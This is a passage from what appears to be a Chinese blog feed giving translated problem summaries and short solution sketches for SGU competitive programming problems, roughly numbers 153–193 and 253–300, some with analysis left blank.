$(k-1)!$ 种排列方案：循环本质上是一个环，将第 $k$ 个元素插入有 $k-1$ 个元素的环时，有 $k-1$ 个位置可以插入，利用归纳法得到 $(k-1)!$ 种排列。 最终点置换的方案数为 $\frac{N!}{\prod x_i^{c_i}c_i!}$。</p><p>利用 burnside 定理，不等价着色方案数为</p><script type="math/tex; mode=display">\frac {1}{N!}\sum \frac{N!}{x_i^{c_i}c_i!}M^{(f)}</script><p><strong>参考</strong> <a href="https://blog.csdn.net/wang3312362136/article/details/79489737" target="_blank" rel="noopener">SGU 282 Isomorphism</a></p><hr><p>281 Championship</p><p><strong>题意</strong> 有 $1\le N\le 50000$ 只队伍参加了 2 场比赛且已知各比赛的排名，现要依据 2 场比赛排名生成最终排名：如果前 $M$ 支队伍在 2 场比赛中是<strong>相同集合</strong>，则最终排名的前 $M$ 支队伍也是该集合。如果无法确定队伍之间的相对排名，则按照队伍名称字典序排序。输出最终排名结果。</p><p><strong>分析</strong> 模拟。</p><hr><p>280 Trade centers</p><p><strong>题意</strong> 给 $1\le N\le 3\times 10^4$ 个点的树，在树上标记若干点使得树上所有点到最近标记点的距离不超过 $1\le K\le 100$，求最少需要标记点的数量。</p><p><strong>分析</strong> 进阶问题 - HDU 5290 Bombing plan。$up(u, i)$ 表示点 u 向上覆盖 $i$ 步的最优值，$dw(u, i)$ 表示点 u 需依赖父节点向下覆盖 $i$ 步的最优值。 </p><hr><p>279 Bipermutations</p><p><strong>题意</strong> 有 $2N,1\le N\le 1000$ 个对象 $1, 1’, 2,2’,\dots, n, n’$，已知存在<strong>偏序</strong>关系：$\forall i\in[1, n], i’\prec i$; $i\prec j \Leftrightarrow i’\prec j’$。定义 $b_{ij}= j’$ if $j &lt;i$ 否则 $b_{ij} = j$ 以及 $a(i)$ 等于 $i\prec b_{ij}$ 的数量，已知序列 $a(1),\dots, a(n)$，判断是否存在满足条件的偏序序列，若存在输出任一方案。 </p><p><strong>分析</strong> 假设<strong>从大到小</strong>放置，经过模拟可以发现几个性质：(1)放置对象 $i$ 时，只会影响 $j&lt;i$ 的 $a(j)$；(2)放置 $i’$ 时会影响 $j&gt;i$ 的 $a(j)$；(3)放置 $i$ 之后才能放置 $i’$。</p><p>首先每次挑选 $a(i)=0$ 的对象 $i$ 放置，如果存在多个 $a(i)=0$ 的对象 $i$，显然选取下标最小的对象 $i$，否则根据性质 (1) 会导致下标最小的对象 $i$ 的 $a(i)$ 发生变化。</p><p>当找不到 $a(i)=0$ 时，<strong>依次</strong>放置已经放置 $i$ 的 $i’$——依次是指 $i\prec j \Leftrightarrow i’\prec j’$ 相对顺序不能发生变化，然后修改 $j&gt;i$ 的 $a(j)$。</p><hr><p>278 Fuel</p><p><strong>题意</strong> 给定 $1\le N\le 75000$ 种燃油，每种燃油<strong>单位质量</strong>下体积为 $a_i$, 成本 $b_i$ 和强度 $c_i$，其中 $0\le a_i, b_i, c_i\le 100$。已知汽车的油箱可容纳 $1\le A\le 1000$ 体积的燃油以及成本限制 $1\le B\le 10000$，在允许任意混合燃油的情况下，求混合燃油的最大强度。</p><p><strong>分析</strong> 假设有 2 种燃油 $(a_i, b_i, c_i), (a_j, b_j, c_j)$，混合后可以得到 $\forall w\in [0, 1], a=wa_i+(1-w)a_j, b=wb_i+(1-w)b_j, c=wc_i+(1-w)c_j$，最终从一种比例的混合燃油中取得最大强度，即 $ans = c\times min\{\frac Aa,\frac Bb\}$。从几何角度看该问题，2 种燃油时混合燃油候选为一条线段，多种燃油时候选为凸多面体。</p><p>记 $x_i = \frac {c_i}{a_i}, y_i=\frac{c_i}{b_i}$，原问题可以转化成 $\max z,z\le Ax_i, z\le By_i$。通过直线 $y=\frac AB x$ 划分 $z$ 上限分别为 $Ax_i$ 和 $By_i$ 的情况，本质上都是线性规划问题，最优解必然在 extreme point（端点）上。</p><hr><p>277 Heroes</p><p><strong>题意</strong> 二维平面初始给 3 个点，随后逐渐添加 $1\le N\le 10^5$ 个点。每次添加点后，重新构造多边形包含当前所有点且周长最短，输出多边形的面积。</p><p><strong>分析</strong> 加点维护凸包，<a href="https://github.com/McGinn7/Template-for-ICPC/blob/master/template/convex_hull.cpp" target="_blank" rel="noopener">参考模板</a></p><hr><p>276 Andrew’s Troubles</p><p><strong>题意</strong> （if else 模拟题）</p><p><strong>分析</strong> 模拟。</p><hr><p>275 To xor or not to xor</p><p><strong>题意</strong> 给 100 个数 $A_i(0 \le A_i \le 10^{18})$，求一个子序列使得异或和最大。</p><p><strong>分析</strong> 线性基。</p><hr><p>274 Spam-filter</p><p><strong>题意</strong> 写一个邮件地址 parser，判断地址合法性。</p><p><strong>分析</strong> Parser。</p><hr><p>273 Game Po</p><p><strong>题意</strong> 给定 200 个石子排成一排，并且每个石子染成蓝、红、黄、白其中一种颜色。四名玩家轮流选择 2 个相邻石子并使用 1 个替换规则颜色的石子替换，直到不能替换为止。游戏开始前，给定允许的替换规则，四种颜色分配给四名玩家，若游戏结束时仅剩 1 个石子，则该石子颜色对应的玩家获胜。求最后可能获胜的颜色。</p><p><strong>分析</strong> 区间 DP。</p><hr><p>272 Evacuation plan</p><p><strong>题意</strong> 给 $1\le N\le 10^4$ 个点和 $1\le M\le 10^5$ 条边的无向图，起点集合 $A$ 以及终点集合 $B$，保证 $A∩B=\empty$。现要找出若干等长路径使得尽可能多的点从 $A$ 走到 $B$，需满足：1. 路径长度等于 $\min\{dist(a, b)|a\in A, b\in B\}$；2. 任意两条路径不能存在交点。<del>求最多的点数以及路径长度，并输出一种路径方案。</del></p><p>随便构造一种方案，使得再也找不到一条从 A 到 B 的路径（不是找一个最优的方案）。</p><p><strong>分析</strong> BFS+DFS。</p><hr><p>271 Book Pile</p><p><strong>题意</strong> 已知有 $0\le N\le 40000$ 个元素的栈，进行 $0\le M\le 10^5$ 次操作：1. 栈顶添加一新元素；2. 将栈顶 $0\le K\le 40000$ 个元素翻转，其中 $K$ 是常数。输出所有操作后的栈元素顺序。</p><p><strong>分析</strong> 伸展树可做，但是大材小用了。操作上只有添加新元素且 $K$ 为常数，一旦栈元素数量超过 $K$，除栈顶 $K$ 个元素外其余元素已经固定了，这部分元素写入固定的栈中即可。而栈顶 $K$ 个元素可能发生多次翻转，使用双端队列可以方便维护往“栈顶”添加数据。</p><hr><p>270 Thimbles</p><p><strong>题意</strong> 给定 $2\le N\le 100$ 个位置以及 $1\le M\le 1000$ 次操作。一开始球在位置 1，每次操作交换 $A_i &lt; B_i$ 位置。已知操作集合但不知操作次序，经过 $M$ 次操作后求解球可能的位置集合。</p><p><strong>分析</strong></p><hr><p>269 Rooks</p><p><strong>题意</strong> 有一个形状特殊的棋盘，该棋盘共 $1\le N\le 250$ 行，每行有 $1\le B_i\le 250$ 列。现要在棋盘上放置 $1\le K\le 250$ 个车，求车不互相攻击的放置方案数。</p><p><strong>分析</strong> 行的顺序无关紧要，因此可以按列宽 $B_i$ 排序。$dp(i, j)$ 表示前 $i$ 行放置 $j$ 个车的方案数即可，转移方程较简单。</p><hr><p>268 Hyper Almost Permutative String</p><p><strong>题意</strong> 若字符串包含前 $N$ 个字符则定义为 permutative；若字符串去掉刚好一个字符后为 permutative 则定义为 almost-permutative；给定字符集 $N$ 后若字符串所有长度为 $N+1$  的子串都是 almost-permutative 则定义该字符串为 hyper-almost-permutative。现给定 $2\le N\le 26$ 以及长度为 $N$ 且为 permutative 的字符串 $S_1,S_2$，求最短 hyper-almost-permutative 字符串且 $S_1, S_2$ 是其子串，多种方案输出任一方案。</p><p><strong>分析</strong></p><hr><p>267 Optimist vs. Pessimist</p><p><strong>题意</strong> 有 $1\le N\le 1000$ 个矩形，每个矩形中有 2 个点。要求从这 $N$ 个矩阵中选 $1\le K\le 10$ 个矩形，使得总面积和尽可能大。如果一个矩形能分成等面积的两部分且每部分都含有一个点，这个矩形会均分给 Optimist 和 Pessimist。Optimist 想知道最好情况下获得面积总和，Pessimist 想知道最坏情况下获得面积综合。</p><p><strong>分析</strong> 等分面积线段必然经过矩形中心，即仅当矩形所包含的 2 个点和中心共线时无法均分。</p><hr><p>266 Berlion</p><p><strong>题意</strong> 给以原点为圆心半径为 $1\le R\le 10$ 的球体以及空间中两个点，求球体表面两个点的可视面积。</p><p><strong>分析</strong></p><hr><p>265 Wizards</p><p><strong>题意</strong> 有 $1\le M\le 10^5$ 个三维空间点，经过 $1\le N\le 1000$ 次变换：平移，缩放和旋转变换，求经过变换后每个点的空间坐标。</p><p><strong>分析</strong> 三种变换都可以使用矩阵表示，将 $N$ 次变换融合成一个变换后应用于所有点即可。困难部分主要是旋转变换，参考<a href="https://www.cnblogs.com/graphics/archive/2012/08/10/2627458.html" target="_blank" rel="noopener">绕任意轴旋转</a>。</p><hr><p>264 Travel</p><p><strong>题意</strong> 有 $1\le N\le 800$ 个男生和 $N$ 个女生，需要进行两两匹配。每个人有自己的偏好列表，若在一个匹配中出现双方都有更加偏好的异性存在时，该匹配是“不稳定”的。求解是否存在“稳定”的匹配方案，若存在输出任一方案。</p><p><strong>分析</strong> （稳定婚姻问题）。</p><hr><p>263 Towers</p><p><strong>题意</strong> 在长度为 $1\le N\le 10^6$ 的行上造塔。塔的定义为：连续位置均放置了方块且两侧都没有方块时，视为一个塔。有放置和询问两种操作：</p><ul><li>放置 1：在位置 x 放置 c 个方块；</li><li>放置 2：在塔 t 的第 x 列放置 c 个方块；</li><li>询问 1：目前塔的数量；</li><li>询问 2：塔 t 中方块的数量；</li><li>询问 3：塔 t 的长度；</li><li>询问 4：塔 t 第 x 列上方块的数量。</li></ul><p><strong>分析</strong> 关键部分是如何快速找出塔 t，只有操作放置 1 时才会增加新塔。可以使用线段树维护每座塔的左边界点，快速查询塔 t 的位置。</p><hr><p>262 Symbol Recognition</p><p><strong>题意</strong> 有 $2\le K\le 6$ 个符号，每个符号由 $N\times M, 1\le N,M\le 10$ 的黑白网格构成。要求最少格子数使得能够区分出所有符号。</p><p><strong>分析</strong></p><hr><p>261 Discrete Roots</p><p><strong>题意</strong> 给两个质数 $2\le P\le 10^9,2\le K\le 10^5$ 和整数 $0\le A\lt P$，求解方程 $x^K=A\pmod P$ 的所有解。</p><p><strong>分析</strong> </p><p><strong>参考</strong> <a href="https://www.cnblogs.com/w007878/p/3621653.html" target="_blank" rel="noopener">一些数论概念与算法——从SGU261谈起</a></p><hr><p>260 Puzzle</p><p><strong>题意</strong> 有 $1\le N\le 200$ 个黑白格子，已知初始颜色。每个格子与若干格子绑定，若当前格子颜色改变时，与其相绑定的格子也会改变颜色。判断是否能够将所有格子改成同一颜色，若能给出任一方案。</p><p><strong>分析</strong> 高斯消元。</p><hr><p>259 Printed PR</p><p><strong>题意</strong> 需要打印 $1\le N\le 100$ 种订单，每种订单需要 $1\le T_i\le 1000$ 分钟打印以及 $1\le L_i\le 1000$ 分钟派送。目前仅有一台打印机但有充足的派送人员同时派送。求完成这 $N$ 份订单的最小总时间。</p><p><strong>分析</strong> 二分答案；经典贪心，比较相邻元素。</p><hr><p>258 Almost Lucky Numbers</p><p><strong>题意</strong> 如果一个数字有 $2N$ 数位且前 $N$ 个数位和等于后 $N$ 个数位和，定义该数字为 lucky-number。如果一个数字修改一个数位使得新数是 lucky-number，定义该数字是 almost-lucky-number。求范围 $[A, B]$ 中的 almost-lukcy-number 数量，其中 $0\le A\le B\le 10^9$。</p><p><strong>分析</strong> 数位 DP。</p><hr><p>257 Debt</p><p><strong>题意</strong> 主角分别欠三个人 $P, O, S(1\le P,O,S\le 10^5)$ 钱，目前手头上的抵押物在不同人看来有不同价值：S 只能抵押 1 货币，B 能抵押 2 货币。现给出主角 $1\le N\le 10^5$ 件抵押物在三个人眼中的价值矩阵，判断主角是否能偿情债务。</p><p><strong>分析</strong></p><hr><p>256 Balloons</p><p><strong>题意</strong> 有 $1\le N\le 10$ 个人和一台机器，需要使用机器填充 $1\le M\le 100$ 个气球，机器每分钟只能一个人使用。第 i 个人一分钟内能填充 $0\le A_i\le 10$ 个气球，但是之后需要休息 $1\le B_i\le 4$ 分钟才能继续工作。求填充 $M$ 个气球的最少分钟数。</p><p><strong>分析</strong></p><hr><p>255 Winsock 3 Beta</p><p><strong>题意</strong> 假设有密钥 $K$，当传送数据在 $[K+1, 2K]$ 之间且二进制位仅 3 位为 1 时能够发送出数据，否则会被拦截。给定数 $0\le M\lt 2^{31}$，判断是否存在唯一的密钥 $K$ 使得能发送的数据个数恰好为 $M$。</p><p><strong>分析</strong> </p><hr><p>254 Strange Random</p><p><strong>题意</strong> 数字 1 至 $1\le N\le 2\times 10^6$ 顺时针依次放置在环上，模拟如下操作：去除当前方向的第 $1\le Q\le 10$ 个数字，移动到顺时针方向的下一个数，若这个数是奇数则改前进方向为顺时针，否则为逆时针。求被去除的最后一个数。 </p><p><strong>分析</strong> 空间限制严格，不能使用双指针来解决。直接使用数组模拟操作过程，中间穿插重构。</p><hr><p>253 Theodore Roosevelt</p><p><strong>题意</strong> 给 $3\le N\le 10^5$ 个点的凸包以及 $0\le M\le 10^5$ 个点，判断多边形是否至少包含 $0\le K\le M$ 个点。</p><p><strong>分析</strong> 单次判断点是否在凸包内可以做到 O(LogN)。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;300 Train&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题意&lt;/strong&gt; 给定水平/垂直方向的火车轨道顶点顺序，在不发生碰撞的前提下，求火车的最大长度。轨道顶点数为 $1\le N\le 4000$，点坐标 $(x_i, y_i), |x_i|, |y_i|\le 10^4
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SGU 153-252</title>
    <link href="http://mcginn7.github.io/2020/10/06/SGU-153-252/"/>
    <id>http://mcginn7.github.io/2020/10/06/SGU-153-252/</id>
    <published>2020-10-06T02:11:12.000Z</published>
    <updated>2021-04-24T04:16:57.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h1><p>计划一年内（截止 2021 年 1 月 1 日）把 SGU 500 刷完，形式以所有题目给出翻译后的简要题意和解题思路概要。</p><p><a href="https://github.com/McGinn7/ACMSGURU-Code" target="_blank" rel="noopener">AC 代码库</a></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>153 <strong>Playing with matches</strong></p><p><strong>题意</strong>  有 $1\le N \le 10^9$ 根火柴，Little 和 Petya 轮流取，每次能取 $1, P_1, P_2, \dots , P_m(2\le P_i \le 9, 0\le m \le 8)$ 根火柴，判断先/后手必胜。</p><p><strong>分析</strong> 当 $N$ 较小时，可用 dp 计算火柴为 $n$ 时状态（必胜/必败）。由于 $P_i\le 9$，每个点的状态只与前面的 9 个状态有关，从而每个状态的 SG 值最大为 10。并且根据 SG 值的定义，前面 9 个状态的 SG 值两两不同，因此 9 个状态的总数约为 $10!=3,628,800‬$。通过找出循环节，即可计算 $N$ 的 SG 值，从而判断胜负态。</p><hr><p>154 <strong>Factorial</strong></p><p><strong>题意</strong>  求最小自然数 $N$，满足 $N!$ 有 $0 \le Q \le 10^8$ 个尾数 0。</p><p><strong>分析</strong>  尾数 0 只与 $N!$ 的质因子 2 和 5 有关。求 $N!$ 中质因子 $p$ 的个数：</p><script type="math/tex; mode=display">\frac N p + \frac N {p^2} + \dots</script><p>显然， 5 的个数少于 2 的个数，因此尾数 0 只与 5 的个数相关。</p><p>上述公式具有<strong>非递减</strong>性质，因此可以<strong>二分</strong>计算最小自然数 $N$。</p><hr><p>155 <strong>Cartesian Tree</strong></p><p><strong>题意</strong>  给定 $1\le N\le 50000$ 个 <key, value> 对，要求利用 key 值构造一棵<strong>二叉搜索树</strong>，并且满足<strong>小根堆</strong>的性质：如果 y 是 x 的父节点，则有 y.value &lt; x.value。数据保证 key 值和 value 值两两不同。</key,></p><p><strong>分析</strong>  Cartisian Tree 模板题。 </p><hr><p>156 <strong>Strange Graph</strong></p><p><strong>题意</strong>  给 $3\le N \le 10^4$ 个点 $M\le 10^5$ 条边的无向图，该图满足以下性质：</p><ol><li>所有点的度数 $deg(v)\ge 2$。</li><li>当 $deg(v)=2$ 时，与 $v$ 相邻的两个点不相连。</li><li>当 $deg(v)&gt;2$ 时，存在点 $u\in N(v)$，满足：$deg(u)=2$；$\forall w_1, w_2\in N(v), (w_1, w_2)\in E$。其中，$N(v)$ 表示与 $v$ 相邻的点集。</li></ol><p>数据保证无重边和自环。</p><p>判断该图是否存在<strong>哈密顿回路</strong>，不存在时输出 -1；否则输出一种方案。</p><p><strong>分析</strong> </p><p>当 $deg(v)&gt;2$ 时，点集 $N(v)/u$ 构成完全图，因此总是能构造出<strong>哈密顿路</strong>。</p><p>将点集 $N(v)/u$ 缩点，构造的新图中所有点的度数均为 2，问题可以转化成在新图中找出<strong>欧拉回路</strong>。</p><p>而度数均为 2 的图，只可能是多个环。因此剩余问题仅需判断新图是否联通即可。</p><hr><p>157 <strong>Patience</strong></p><p><strong>题意</strong>  纸牌接龙游戏，A~K（共 13 张牌）放置到 14 个格子中，其中一个为空格且 A 固定到第 1 个格子中。在前 $14-n$ 张牌有序的前提下，求能够将牌排好序且最后一格为空格的方案数。</p><p>移牌规则为：当空格<strong>左侧</strong>为 $x$ 时，可将 $x+1$ 直接移动到空格上。</p><p><strong>分析</strong>  最后局面为 A23…JQK_，反向构造合法序列即可。注意正向移牌时，$x+1$ 的前一个数为 $x$。因此反向构造时只有当 $a[i+1]=a[i]+1$ 时，才能将 $a[i+1]$ 和空格交换形成新合法序列。</p><hr><p>158 <strong>Commuter Train</strong></p><p><strong>题意</strong>  有长为 $0&lt;L\le 5000$ 的公交路线。有 $0&lt;M\le 300$ 个乘客，乘客在坐标 $P_i$ 处，坐标非递减排序（$0\le P_1 \le \dots \le P_M \le L$）。有 $0&lt; N\le 300$ 个站点，每个站点距离第 1 个站点的距离为 $D_i(0=D_1&lt;D_2&lt;\dots &lt; D_N\le L)$。</p><p>第 1 个站点位置 $S$ 未确定，要求求出 $S$ 使得每个乘客距离其<strong>最近</strong>的站点距离之和<strong>最大</strong>。</p><p><strong>分析</strong>  在确定 $S$ 后，乘客与最近站点的距离和可表示为关于 $S$ 的一次函数。随着 $S$ 的增大，每个乘客的最近站点会发生变化，但新的距离和仍可表示为一次函数，且在一段距离范围内该函数不会改变。</p><p>距离和函数改变点在于其中一个乘客的最近站点变化。由于乘客的最近站点随 $S$ 增大的增大，因此总的变化次数为 $O(NM)$，且站点变化只会 +1。</p><hr><p>159 <strong>Self-Replicating Numbers</strong></p><p><strong>题意</strong>  在 $2\le b \le 36$ 进制下，求 $1\le n\le 2000$ 个位的数满足 $x^2\equiv x\pmod {b^n}$。</p><p><strong>分析</strong> 爆搜。  </p><hr><p>160 <strong>Magic Multiplying Machine</strong></p><p><strong>题意</strong>  给 $1\le N \le 10^4$ 个数 $1\le a_i\le M(2\le M \le 10^3)$，求最大得分 score：</p><script type="math/tex; mode=display">score=\prod a_i \mod M</script><p>并给出任意一种方案，按<strong>递增</strong>顺序输出取出值的下标。</p><p><strong>分析</strong>  背包问题。</p><hr><p>161</p><p><strong>题意</strong>  </p><p><strong>分析</strong></p><hr><p>162 <strong>Pyramids</strong></p><p><strong>题意</strong>  给定四面体各边（AB, AC, AD, BC, BD, CD）长度，求体积。</p><p><strong>分析</strong> 建个坐标系，强算各个点坐标。</p><hr><p>163 <strong>Wise King</strong></p><p><strong>题意</strong>  给 $1 \le N\le 100$ 个数 $a_i, |a_i|\le 3$，以及一个指数 $0&lt;E\le 3$。从 $N$ 个数中取若干个数，使得 $\sum a_i ^E$ 最大。</p><p><strong>分析</strong> 模拟。</p><hr><p>164 <strong>Airlines</strong></p><p><strong>题意</strong>  有 $1\le N\le 200$ 座城市，每两个城市都有一条航线（双向飞行），每条航线属于 $M$ 家公司中的其中一家。现要求收购不超过 $\lfloor \frac{M+1}2\rfloor$ 家公司，使得<strong>任意</strong>两个城市<strong>最多</strong>飞 3 条航线可达。</p><p><strong>分析</strong> 根据抽屉原理，至少有一座城市所有航线关联的公司为 $\lfloor\frac {2M}N \rfloor \le \lfloor \frac{M+1}2\rfloor$，因此以城市为中心，收购该城市所有公司即可满足任意两座城市之间最多飞 2 条航线即可到达。</p><hr><p>165 <strong>Basketball</strong></p><p><strong>题意</strong> 有 $1\le N \le 6000$ 名球员，每名球员的身高 $h_i$ 在 [1.95, 2.05] 范围内。现要求给球员排序，使得任意两个球员之间满足 $|\sum_{i=1}^{K} (h_i - 2)| \le 0.1$。给出一种球员顺序或判断无解。</p><p><strong>分析</strong> 将所有球员的身高 - 2，将球员身高分成负数和正数。从最小负数（或最大正数）开始取，根据前缀和的正负取异号身高的球员即可。由于球员身高限定在 [1.95, 2.05] 之间，因此不会违反限定条件。</p><hr><p>166</p><p><strong>题意</strong>  </p><p><strong>分析</strong></p><hr><p>167 <strong>I-country</strong></p><p><strong>题意</strong> 给 $N\times M(1\le N, M\le 15)$ 的网格，每个网格有个价值 $0 \le V_{ij}\le 10^3 $ 。允许占领其中 $K$ 个网格，要求任意两个格子之间使用上下左右四个方向中的<strong>两个</strong>方向可达，求最大的价值和并给出一种方案。 </p><p><strong>分析</strong> 最后占领的形状为菱形，使用 dp 解决上半部分（三角形）：$dp(i,j,k)$ 表示前 i 行共占领了 k 个网格且第 i 行占领的格子数为 j 的最大价值和。状态转移时保持 j 非递减即可。最后枚举中间行，将上下两个三角形合并成菱形。</p><hr><p>168 <strong>Matrix</strong></p><p><strong>题意</strong> 给定 $N\times M(1\le N, M\le 1000)$ 大小的矩阵 $A$，求矩阵 $B$ 满足</p><script type="math/tex; mode=display">B_{ij}=\min_{y\ge j\and x\ge i+j-y} A_{xy}</script><p><strong>分析</strong> 随便做。</p><hr><p>169 <strong>Numbers</strong></p><p><strong>题意</strong> 定义 $P(n)$ 为 $n$ 的所有数位之积；如果 $P(n)\neq 0 \and P(n)|n$ 定义 $n$ 是 good number; 如果 $n$ 和 $n+1$ 都是 good number 定义 $n$ 是 prefect number。给定 $1\le K \le 10^6$，求所有 $K$ 位的 perfect number 数量。</p><p><strong>分析</strong> 显然的事实是 $n$ 的个位数在 [1, 8] 范围内，如果 $n = 10x+y$，则 $n+1=10x+y$ 且 $P(n)=y\times P(x), P(n+1)=(y+1)\times P(x)$。因为 $n,n+1$ 都是 good number，所以有 $P(n)|n\and P(n+1)|(n+1)$，推断出 $P(x)|n\and P(x)|(n+1)$。又因为 $n,n+1$ 是互质的，所以 $\gcd(n, n+1)=1$，进而得出 $P(x)=1$。最后 $n=11\dots1w$ 的形式。</p><hr><p>170 <strong>Particles</strong></p><p><strong>题意</strong> 有两个 5000 长度的 +- 序列，每次操作可以交换相邻的 +- 粒子。求最少操作次数将序列 1 转变为序列 2。</p><p><strong>分析</strong> （<em>猜测</em>）按序匹配 -/+，计算其距离之和即可。</p><hr><p>171 <strong>Sarov zones</strong></p><p><strong>题意</strong> 有 $1\le K\le 100$ 赛区，每个赛区选 $N_i$ 个人，总共 $\sum N_i$ 个人，每个人有个能力值 $P_i$ 以及权重 $W_i$，相应的赛区有强度值 $Q_i$。若选手能力值大于赛区强度 $P_i &gt; Q_j$ 则晋级。求一种方案使得晋级选手的权重和最大。</p><p><strong>分析</strong> 先选权重大的选手，选取最大 $Q_j &lt; P_i$ 即可。</p><hr><p>172 <strong>eXam</strong></p><p><strong>题意</strong> $1\le M \le 30000$ 学生从 $1\le N \le 200$ 门课中选 2 门考试，学校安排所有考试在两日内，求一种方案或判断不可能。所有学生的考试课程不同在同一天考试。</p><p><strong>分析</strong> 二分图染色。</p><hr><p>173</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>174 <strong>Walls</strong></p><p><strong>题意</strong> 给定 $1\le M \le 200000$ 条线段，坐标范围 $|x_i|,|y_i|\le 10^9$，保证线段只在端点相交。求第几条线段加入后有封闭多边形。</p><p><strong>分析</strong> 并查集。</p><hr><p>175 <strong>Encoding</strong></p><p><strong>题意</strong> 假设有字符串 $W=w_1w_2\dots w_n$，编码函数 $phi(W)$ 如下：</p><script type="math/tex; mode=display">phi(W) = \begin{cases} 1,& len(W)=1\\ phi(w_Nw_{N-1}\dots w_{K+1}+phi(w_Kw_{K-1}\dots w_1)),&else   \end{cases}</script><p>其中 $K = \lfloor \frac {len(W)}2 \rfloor$。</p><p>先给定 $1\le len(W)\le 10^9$ 长度以及原字符串的位置 $q$，求编码字符串中对应原位置 $q$ 的位置。</p><p><strong>分析</strong> 判断 $q$ 在左右哪个子串中，划分成子问题求解即可。</p><hr><p>176 <strong>Flow construction</strong></p><p><strong>题意</strong> 有 $1\le N\le 100$ 个结点和 $M$ 条管道，管道从结点 $U_i$ 流向 $V_i$ 且容量上限为 $Z_i$。化学物质从结点 1 经过若干管道流进结点 $N$，现要求部分管道<strong>必须流满</strong>($C_i = 1$)的前提下，该管道网络的最小流量。</p><p><strong>分析</strong> 有源汇上下界最小流。</p><hr><p>177 <strong>Square</strong></p><p><strong>题意</strong>  给 $1000×1000$ 的矩形，进行 $5000$ 次染色，每次将一个子矩形染成黑色或白色。初始所有格子都是白色的情况下，染色完后的白色格子数。</p><p><strong>分析</strong> 扫描线+线段树；bitset。</p><hr><p>178 <strong>Golden chain</strong></p><p><strong>题意</strong>  给长为 $1\le N\le 10^{16}$ 长的金链条，Peter 每天需要支付 1 长度的金条，支付的方式有两种：一种是直接支付 1 长度金条；另一种是支付大于 1 长度的金条并使用之前支付的金条找零。零钱的组成由 Peter 指定。Peter 每次可以从长金条上切掉 1 长度的金条，将长金条切分成 3 段。现想知道最少切几次可以满足 $N$ 天的支出。 </p><p><strong>分析</strong> 假设最终切出 k 个 1 长度金条，那么将剩下的 N - k 长度视为完整的金条，允许切 k 刀划分成 k + 1 段。前 k 天直接支付 1 长度即可。第 k + 1 天切出 k + 1 长度金条，找零 k 个 1 长度从而k + 2 ~ 2k + 1 天继续每天支付 1 长度。第 2k + 2 天切出 2k + 2 长度金条，兑换出之前支付的金条又开始循环（假设切不出 2k + 2 长度，那么也能找出类似的策略来满足每天 1 长度的支付）。因此切 k 次的最多能满足 $k + (k + 1) + 2(k + 1) + … + 2^k(k+1)=2^{k+1}(k+1)-1$ 天的支付需求，枚举 k 即可。 </p><hr><p>179 <strong>Brackets light</strong></p><p><strong>题意</strong>  给长为 10000 合法的括号序列(仅包含 ‘(‘ 和 ‘)’，并且字典序 ‘(‘ &lt; ‘)’)，求下一个字典序的合法括号序列。 </p><p><strong>分析</strong> 从后往前找第一个能 ‘(‘ 转为 ‘)’ 的位置，之后尽量填 ‘(‘ 来保证中间不会有更小字典序且满足题意的括号序列。尽量的意思就是在该位置填 ‘(‘ 后仍有足够的位置放置 ‘)’，这个可以通过前缀和思想解决。</p><hr><p>180 <strong>Inversions</strong></p><p><strong>题意</strong>  $1\le N\le 65537$ 个数 $0\le A_i\le 10^9$ 的逆序对数。</p><p><strong>分析</strong> 。</p><hr><p>181 <strong>X-Sequence</strong></p><p><strong>题意</strong>  。</p><p><strong>分析</strong> 找循环节。</p><hr><p>182 <strong>Open the brackets</strong></p><p><strong>题意</strong>  给由 10 个变量组成的布尔表达式，运算符包括：!, (), ||, &amp;, &lt;=&gt;, =&gt;, #，变量名从 ‘a’ 到 ‘j’ 共 10 个。要求去掉括号 () 运算符的等价布尔表达式，字符数量小于 32768。</p><p><strong>分析</strong> 10 个布尔变量的组合数为 2^10 = 1024 种，仅使用 !, ||, &amp; 来枚举所有情况的字符数不会超过 32768：使用 || 拼接不同组合，数量为 2 <em> 2^10 = 2048；! 的数量为 10 </em> 2^9 = 5120；&amp; 组合 10 个变量的数量为 9 <em> 2^10 = 9216，变量名的数量为 10 </em> 2^10 = 10240。</p><hr><p>183 <strong>Painting the balls</strong></p><p><strong>题意</strong>  初始有 $2\le N\le 10^4$ 个白球，可花费 $1\le C_i\le 10^4$ 染料将第 i 个球染成黑球。现要求在<strong>任意连续</strong> $2\le M\le 100$ 个球中至少有 2 个黑球，求最少需要花费多少染料。</p><p><strong>分析</strong> $dp(i, j)$ 表示将第 $i$ 个位置染黑的前提下，前一个黑球位置 $p \ge i-j$ 的最小代价。</p><p>状态转移方程为</p><script type="math/tex; mode=display">dp(i, j) = \min_{i - j - k \ge i - M} {dp(i - j, k)} + C_i</script><hr><p>185 <strong>Two shortest</strong></p><p><strong>题意</strong>  给 $2\le N\le 400$ 个点带边权的无向图，找出两条无共用边的两条最短路（允许有交点）。</p><p><strong>分析</strong> 最小费用流。</p><hr><p>187 <strong>Twist and whirl - want to cheat</strong></p><p><strong>题意</strong>  （splay 模板题）</p><hr><p>188 <strong>Factory guard</strong></p><p><strong>题意</strong>  有 $1\le N\le 20$ 个人站在 1000 长度圆环上的整数点位置，每个人有行走速度 $-100\le V_i \le 100$ 以及两两不同的位置 $0\le L_i\le 999$。$V_i \lt 0$ 表示逆时针行走，$V_i \gt 0$ 则表示顺时针行走。每个人会向对面走来的人打招呼，求 $1\le T\le 50$ 时间后每个人打招呼的次数。</p><p><strong>分析</strong> 可以求顺时针和逆时针第一次碰面的时间，之后再相遇的时间是固定的。</p><p><strong>todo</strong> 数据范围能否变大？</p><hr><p>190 Dominoes</p><p><strong>题意</strong>  $40×40$ 的棋盘上有 $P$ 个格子被移除，判断能否用 1×2 或 2×1 的多米诺覆盖所有未被移除的格子且不相交。</p><p><strong>分析</strong> 相邻格子的 x+y 奇偶性不同，因此原问题可以转变为二分图的最大匹配。</p><hr><p>192 RGB</p><p><strong>题意</strong>  给 300 条线段，每条线段的颜色为 RGB 三种中的一种，任意两条线段至多一个交点。将线段投影到 X 轴，每段投影的颜色为离 X 轴最近线段的颜色。求投影后每种颜色的长度之和。</p><p><strong>分析</strong> 求出所有交点后划分投影线段区间，每段区间取中点并判断中点所在线段的颜色。</p><hr><p>193 <strong>Chinese 